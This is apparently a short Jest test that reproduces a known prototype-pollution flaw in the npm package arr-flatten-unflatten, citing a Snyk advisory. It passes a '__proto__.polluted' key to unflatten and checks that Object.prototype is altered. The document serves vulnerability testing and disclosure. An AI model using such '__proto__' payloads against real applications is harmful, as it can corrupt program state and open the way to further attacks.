//https://snyk.io/vuln/SNYK-JS-ARRFLATTENUNFLATTEN-598396
test("prototype pollution in arr-flatten-unflatten", () => {
  expect({}.polluted).toBe(undefined);

  const { unflatten } = require("arr-flatten-unflatten");
  unflatten({ "__proto__.polluted": "yes" });

  expect({}.polluted).toBe("yes");
});
